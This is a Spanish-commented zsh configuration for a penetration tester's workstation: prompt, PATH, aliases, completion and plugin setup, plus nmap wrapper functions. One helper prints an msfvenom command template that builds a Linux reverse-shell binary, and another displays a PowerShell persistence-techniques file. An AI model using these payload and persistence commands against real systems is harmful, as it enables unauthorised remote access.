# ═══════════════════════════════════════════════════════════
# ZSH 2026 - Starship + Funciones Enhanced [CORREGIDO]
# ═══════════════════════════════════════════════════════════

[[ -n "${ZSHRC_LOADED-}" ]] && return
ZSHRC_LOADED=1

FUNCNEST=500

export _JAVA_AWT_WM_NONREPARENTING=1
export XDG_CONFIG_HOME="$HOME/.config"
export XDG_DATA_HOME="$HOME/.local/share"
export XDG_CACHE_HOME="$HOME/.cache"

# ═══════════════════════════════════════════════════════════
# STARSHIP PROMPT
# ═══════════════════════════════════════════════════════════
if command -v starship &>/dev/null; then
    export STARSHIP_CONFIG="$HOME/.config/starship.toml"
    type starship_zle-keymap-select >/dev/null 2>&1 || eval "$(starship init zsh)"
fi

# ═══════════════════════════════════════════════════════════
# TERMINAL TITLE
# ═══════════════════════════════════════════════════════════
echo -en "\e]2;Parrot Terminal\a"
preexec () { print -Pn "\e]0;$1 - Parrot Terminal\a" }

# ═══════════════════════════════════════════════════════════
# PATH Y VARIABLES (Corregido: ~ → $HOME, sin duplicados)
# ═══════════════════════════════════════════════════════════
export PATH="$HOME/.bin:$HOME/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/opt/go/bin:/opt/kerbrute:/opt/ghidra:$HOME/go/bin:$HOME/bin"

export ORACLE_HOME=/usr/lib/oracle/21/client64/
export LD_LIBRARY_PATH="$LD_LIBRARY_PATH:$ORACLE_HOME/lib"
export PATH="$PATH:${ORACLE_HOME}bin"

# Editor y entorno
export EDITOR="nvim"
export VISUAL="nvim"
export GIT_EDITOR="nvim"
export PAGER="bat"
export MANPAGER="bat -p"

# NODE_PATH: solo si npm está disponible
if command -v npm &>/dev/null; then
    export NODE_PATH="$(npm root -g 2>/dev/null)"
fi

# ═══════════════════════════════════════════════════════════
# ZOXIDE (CD INTELIGENTE)
# ═══════════════════════════════════════════════════════════
if command -v zoxide &>/dev/null; then
    eval "$(zoxide init zsh)"
fi

# ═══════════════════════════════════════════════════════════
# FUNCIONES PENTESTING
# ═══════════════════════════════════════════════════════════

# Extraer puertos e IP de archivos nmap
function extractPorts() {
    if [[ -z "$1" ]]; then
        echo "Uso: extractPorts <archivo_nmap>"
        echo "Ejemplo: extractPorts scan.xml"
        return 1
    fi
    if [[ ! -f "$1" ]]; then
        echo "Error: Archivo no encontrado: $1"
        return 1
    fi
    
    local ports=$(grep -oP '\d{1,5}/open' "$1" | awk -F'/' '{print $1}' | sort -u | xargs | tr ' ' ',')
    local ip_addr=$(grep -oP '^Host: .* \(.*\)' "$1" | head -1 | awk '{print $2}')
    local timestamp=$(date +%Y-%m-%d\ %H:%M)
    
    echo ""
    echo "╔════════════════════════════════════════╗"
    echo "║     EXTRACTED NMAP RESULTS             ║"
    echo "╠════════════════════════════════════════╣"
    echo "║  📅 Hora: $timestamp"
    echo "║  🌐 IP:   $ip_addr"
    echo "║  🔌 Puertos: $ports"
    echo "╚════════════════════════════════════════╝"
    
    if command -v xclip &>/dev/null; then
        echo -n "$ports" | xclip -sel clip 2>/dev/null && echo "   ✓ Copiado al portapapeles" || echo "   ⚠ Error al copiar"
    else
        echo "   ⚠ xclip no instalado"
    fi
}

# Crear estructura de directorios para assessment
function mkt() {
    local name="${1:-assessment}"
    mkdir -p "$name"/{nmap,content,exploits,scripts}
    cd "$name" 2>/dev/null || true
    echo "✓ Estructura creada: $name/"
    ls -la
}

# Escaneo rápido de puertos
function quickScan() {
    if [[ -z "$1" ]]; then
        echo "Uso: quickScan <ip> [puertos]"
        echo "Ejemplo: quickScan 192.168.1.1 22,80,443"
        return 1
    fi
    local target="$1"
    local ports="${2:-1-1000}"
    echo "🔍 Escaneando $target puertos $ports..."
    nmap -sV -p "$ports" -oA quick_scan_$target "$target"
}

# Enumeración de servicios
function enumSVC() {
    if [[ -z "$1" ]]; then
        echo "Uso: enumSVC <ip>"
        return 1
    fi
    echo "🔍 Enumerando servicios en $1..."
    nmap -sV -sC -O -oA enum_$1 "$1"
}

# Web reconnaissance
function webRecon() {
    if [[ -z "$1" ]]; then
        echo "Uso: webRecon <dominio>"
        return 1
    fi
    echo "🌐 Reconocimiento web de $1..."
    nmap -p80,443,8080,8443 --script=http-title,http-headers,http-whatweb -oA web_$1 "$1"
}

# Función para ver headers HTTP
function httpHeaders() {
    if [[ -z "$1" ]]; then
        echo "Uso: httpHeaders <url>"
        return 1
    fi
    curl -I -L "$1" 2>/dev/null | head -30
}

# Payload generation helper
function genPayload() {
    echo "╔════════════════════════════════════════╗"
    echo "║     PAYLOAD GENERATOR                  ║"
    echo "╠════════════════════════════════════════╣"
    echo "║  msfvenom -p linux/x64/shell_reverse_tcp"
    echo "║     LHOST=<ip> LPORT=<port> -f elf > shell.elf"
    echo "╚════════════════════════════════════════╝"
}

# ═══════════════════════════════════════════════════════════
# FUNCIONES UTILITARIAS
# ═══════════════════════════════════════════════════════════

# Cifrado/Descifrado
function hex-encode() { echo -n "$@" | xxd -p; }
function hex-decode() { echo -n "$@" | xxd -p -r; }
function rot13() { echo -n "$@" | tr 'A-Za-z' 'N-ZA-Mn-za-m'; }
function rot47() { echo -n "$@" | tr '!-~' 'P-~!-O'; }
function base64-encode() { echo -n "$@" | base64; }
function base64-decode() { echo -n "$@" | base64 -d; }

# Extraer archivos automáticamente
function extract() {
    if [[ -f "$1" ]]; then
        case "$1" in
            *.tar.bz2) tar xjf "$1" ;;
            *.tar.gz) tar xzf "$1" ;;
            *.bz2) bunzip2 "$1" ;;
            *.rar) unrar x "$1" ;;
            *.gz) gunzip "$1" ;;
            *.tar) tar xf "$1" ;;
            *.tbz2) tar xjf "$1" ;;
            *.tgz) tar xzf "$1" ;;
            *.zip) unzip "$1" ;;
            *.7z) 7z x "$1" ;;
            *.xz) unxz "$1" ;;
            *) echo "⚠ Formato no soportado: $1" ;;
        esac
    else
        echo "⚠ Archivo no existe: $1"
    fi
}

# Persistences helper
function persistences() {
    if [[ -f /opt/persistences/persistences ]]; then
        cat /opt/persistences/persistences -l powershell
    else
        echo "⚠ Archivo no encontrado: /opt/persistences/persistences"
    fi
}

# Navegación rápida
function cdp() { cd "$(find ~/Proyectos -type d -maxdepth 2 2>/dev/null | fzf)" 2>/dev/null || true; }
function cdd() { cd "$(fd -t d -H -d 2 . ~ 2>/dev/null | fzf)" 2>/dev/null || true; }
function cds() { cd "$(zoxide query --list 2>/dev/null | fzf)" 2>/dev/null || true; }

# Información del sistema
function sysinfo() {
    echo "╔════════════════════════════════════════╗"
    echo "║     SYSTEM INFO                          ║"
    echo "╠════════════════════════════════════════╣"
    echo "║  🖥️  Hostname: $(hostname)"
    echo "║  🖧  IP: $(hostname -I 2>/dev/null | awk '{print $1}')"
    echo "║  🕐  Uptime: $(uptime -p 2>/dev/null || uptime)"
    echo "║  💾  RAM: $(free -h 2>/dev/null | awk '/^Mem:/ {print $3 "/" $2}')"
    echo "║  💿  Disco: $(df -h / 2>/dev/null | awk 'NR==2 {print $3 "/" $2 " (" $5 ")"}')"
    echo "╚════════════════════════════════════════╝"
}

function myip() { curl -s ifconfig.me; echo ""; }
function weather() { curl -s wttr.in; echo ""; }
function ports() { ss -tulanp 2>/dev/null | grep LISTEN; }

# Notas rápidas
function note() {
    local file="$HOME/Documentos/Tech/Notas/$(date +%Y-%m-%d).md"
    mkdir -p "$(dirname "$file")"
    echo "## $(date +%H:%M) - $1" >> "$file"
    echo "   $2" >> "$file"
    echo "✓ Nota guardada en $file"
}

# ═══════════════════════════════════════════════════════════
# ALIAS MODERNOS
# ═══════════════════════════════════════════════════════════

# LSD (reemplazo de ls)
if command -v lsd &>/dev/null; then
    alias ls='lsd --group-dirs=first --icon=auto'
    alias ll='lsd -lh --group-dirs=first --icon=auto'
    alias la='lsd -la --group-dirs=first --icon=auto'
    alias l='lsd --group-dirs=first --icon=auto'
    alias lla='lsd -lha --group-dirs=first --icon=auto'
    alias lt='lsd --tree --level=2 --icon=auto'
    alias ltd='lsd --tree --level=3 --icon=auto'
fi

# BAT (reemplazo de cat)
if command -v bat &>/dev/null; then
    alias cat='bat --theme=Catppuccin\ Mocha'
    alias catnp='bat --paging=never'
    alias catnpl='bat --paging=never --style plain'
fi

# GIT
alias g='git'
alias gs='git status'
alias ga='git add'
alias gc='git commit -m'
alias gp='git push'
alias gl='git log --oneline --graph --decorate -10'
alias gco='git checkout'
alias gb='git branch'
alias gd='git diff'
alias gm='git merge'
alias gr='git rebase'
alias gf='git fetch'
alias gst='git stash'
alias gstp='git stash pop'

# DOCKER
alias d='docker'
alias dc='docker compose'
alias dps='docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"'
alias di='docker images --format "table {{.Repository}}\t{{.Tag}}\t{{.Size}}"'
alias dlog='docker logs -f --tail=50'
alias dex='docker exec -it'
alias dprune='docker system prune -af'

# KUBERNETES (Corregido: kga único)
alias k='kubectl'
alias kgp='kubectl get pods -A'
alias kgs='kubectl get svc -A'
alias kgd='kubectl get deploy -A'
alias kga='kubectl get all -A'
alias kdp='kubectl describe pod'
alias kds='kubectl describe svc'
alias klf='kubectl logs -f'
alias kx='kubectl exec -it'

# SYSTEM
alias update='paru -Syu'
alias clean='paru -Scc'
alias mem='free -h'
alias disk='df -h'
alias topcpu='ps aux --sort=-%cpu | head -10'
alias topmem='ps aux --sort=-%mem | head -10'

# NAVEGACIÓN RÁPIDA
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias .....='cd ../../../..'

# SEGURIDAD
alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'

# DATABASE
alias mysql='/usr/bin/mariadb'

# ═══════════════════════════════════════════════════════════
# COMPLETADO Y AUTOCOMPLETE
# ═══════════════════════════════════════════════════════════
autoload -Uz compinit
if [[ -d "${ZDOTDIR:-$HOME}/.cache" ]]; then
    compinit -d "${ZDOTDIR:-$HOME}/.cache/zcompdump"
else
    mkdir -p "${ZDOTDIR:-$HOME}/.cache"
    compinit -d "${ZDOTDIR:-$HOME}/.cache/zcompdump"
fi

zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete _correct _approximate _match
zstyle ':completion:*' format '▸ %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' menu select
zstyle ':completion:*' matcher-list 'm:{a-z}={A-Z}' 'r:|=*' 'l:|=* r:|=*'
zstyle ':completion:*' use-cache on
zstyle ':completion:*' cache-path ~/.cache/zcompdump
zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
zstyle ':completion:*' verbose true

# ═══════════════════════════════════════════════════════════
# VI MODE
# ═══════════════════════════════════════════════════════════
KEYTIMEOUT=10
bindkey -v

# ═══════════════════════════════════════════════════════════
# HISTORIAL
# ═══════════════════════════════════════════════════════════
HISTFILE=~/.cache/zsh_history
HISTSIZE=30000
SAVEHIST=30000
setopt histignorealldups sharehistory histignorespace histverify appendhistory incappendhistory

# ═══════════════════════════════════════════════════════════
# FZF
# ═══════════════════════════════════════════════════════════
[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh
export FZF_DEFAULT_OPTS='--height 50% --layout=reverse --border --color=bg+:#1e1e2e,fg:#cdd6f4,hl:#89b4fa,fg+:#cdd6f4,hl+:#f38ba8 --marker=• --prompt=› '
export FZF_CTRL_T_OPTS="--preview 'bat --color=always --style=numbers --line-range=:100 {}'"
export FZF_ALT_C_OPTS="--preview 'lsd -la --color=always {}'"
export FZF_CTRL_R_OPTS="--preview 'echo {}' --preview-window=hidden --sort"

# ═══════════════════════════════════════════════════════════
# BINDKEYS
# ═══════════════════════════════════════════════════════════
bindkey "^[[A" up-line-or-history
bindkey "^[[B" down-line-or-history
bindkey "^[[H" beginning-of-line
bindkey "^[[F" end-of-line
bindkey "^[[3~" delete-char

autoload -Uz edit-command-line
bindkey '^E' edit-command-line
bindkey '^P' history-beginning-search-backward
bindkey '^N' history-beginning-search-forward
bindkey '^R' fzf-history-widget
bindkey '^F' fzf-file-widget

# ═══════════════════════════════════════════════════════════
# ALT+ARROWS (word movement) — cubre todos los terminales
# ═══════════════════════════════════════════════════════════
bindkey "^[[1;3D" backward-word
bindkey "^[[1;3C" forward-word
bindkey "^[[1;3D" backward-word
bindkey "^[[1;3C" forward-word
bindkey "^[[1;5D" backward-word
bindkey "^[[1;5C" forward-word
bindkey "^[^[[D" backward-word
bindkey "^[^[[C" forward-word
bindkey "^[^[OD" backward-word
bindkey "^[^[OC" forward-word

# ═══════════════════════════════════════════════════════════
# PLUGINS ZSH
# ═══════════════════════════════════════════════════════════

# Autosuggestions
if [[ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]]; then
    source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#6c7086'
    ZSH_AUTOSUGGEST_STRATEGY=(history completion)
    ZSH_AUTOSUGGEST_MAX_LENGTH=150
fi

# Syntax Highlighting
if [[ -f /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]]; then
    ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern cursor)
    source /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
    ZSH_HIGHLIGHT_STYLES[command]='fg=cyan'
    ZSH_HIGHLIGHT_STYLES[alias]='fg=green'
    ZSH_HIGHLIGHT_STYLES[builtin]='fg=blue'
    ZSH_HIGHLIGHT_STYLES[function]='fg=yellow'
    ZSH_HIGHLIGHT_STYLES[path]='fg=underline,fg=white'
    ZSH_HIGHLIGHT_STYLES[argument]='fg=magenta'
fi

# ═══════════════════════════════════════════════════════════
# UTILIDADES Y ENTORNO
# ═══════════════════════════════════════════════════════════
[ -f "$HOME/.cargo/env" ] && source "$HOME/.cargo/env"

export GTK_THEME=Catppuccin-Mocha-Blue-Dark
export QT_QPA_PLATFORMTHEME=gtk2
export XDG_CURRENT_DESKTOP=XFCE
export XDG_SESSION_TYPE=x11
export COLORTERM=true
export TERM=xterm-256color

# PATH adicional para npm global (corregido con comillas)
export PATH="$HOME/.npm-global/bin:$PATH"
